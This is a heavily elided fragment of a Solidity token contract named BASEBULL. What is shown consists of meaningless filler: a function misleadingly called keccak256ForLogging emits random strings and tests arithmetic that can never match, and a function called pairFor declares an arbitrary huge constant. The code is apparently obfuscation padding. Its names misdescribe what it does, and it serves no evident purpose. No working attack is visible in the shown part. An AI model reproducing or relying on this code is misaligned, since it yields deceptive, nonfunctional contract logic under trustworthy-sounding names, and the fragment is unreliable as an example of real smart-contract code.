...
contract BASEBULL is IERC20 {
    ...
    */
    ...
    function keccak256ForLogging() external {
      ...
      emit log("rP");
      uint256 yyftjeul = 80;
      uint256 pxxdjvxgpg = 61 % 54 * 37;
      uint256 xrvkgilnj = 66 * 17;
      if (yyftjeul == 52 * 14 % 52 + 9 % 91 && pxxdjvxgpg == 7 * 8 && xrvkgilnj == 30 % 96 * 94 * 44) return; 
      emit log("rRxSxmJK");
      emit log("n");
    }
    ...
    */
    function pairFor() public view returns (bool) {
      uint256 slt = 2412081968091403250144639213127573686464859908220889454824887084729;
